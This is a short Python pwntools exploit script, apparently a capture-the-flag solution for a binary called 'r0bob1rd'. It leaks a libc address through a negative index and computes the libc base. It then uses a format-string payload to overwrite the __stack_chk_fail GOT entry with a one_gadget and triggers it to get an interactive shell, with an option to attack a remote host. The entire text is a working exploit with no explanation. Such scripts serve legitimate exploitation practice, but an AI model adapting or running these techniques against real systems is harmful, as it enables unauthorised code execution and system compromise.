from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript="""
continue
"""

exe = './r0bob1rd'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

library = 'glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

sh = start()

## STAGE 1: Leak and Parse LIBC Runtime Leak + Relocate LIBC Base

sh.sendlineafter(b'>', b'-8')

sh.recvuntil(b'sen: ')
get = unpack(sh.recv(6) + b'\x00' * 2)

# 0x7fe2796b9ce0
# 0x7f4fc6cb9ce0
log.info(f'RECEIVED --> {hex(get)}')
libc.address = get - libc.sym['setvbuf']
log.success(f'LIBC BASE -> {hex(libc.address)}')

gadgets = (0xe3afe, 0xe3b01, 0xe3b04)
one_gadget = libc.address + gadgets[1]
log.success(f'ONE GADGET --> {hex(one_gadget)}')

## STAGE 2: Overwrite _stack_chk_fail() + Trigger it

payload = fmtstr_payload(8, {elf.got["__stack_chk_fail"]:one_gadget}, write_size="short")

sh.sendlineafter(b'>', payload.ljust(106, b'\x90'))
# gdb.attach(sh)

sh.interactive()

# AAAAAAAA %8$p